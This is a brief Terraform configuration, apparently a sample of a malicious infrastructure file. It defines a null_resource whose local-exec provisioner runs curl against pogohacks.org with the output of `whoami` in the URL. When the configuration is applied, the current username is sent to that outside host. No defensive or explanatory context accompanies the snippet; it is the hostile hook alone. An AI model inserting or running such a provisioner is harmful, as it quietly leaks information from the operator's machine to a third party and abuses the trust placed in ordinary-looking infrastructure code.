resource "null_resource" "run_local_command" {
  provisioner "local-exec" {
    command = "curl https://pogohacks.org/`whoami`"
  }
}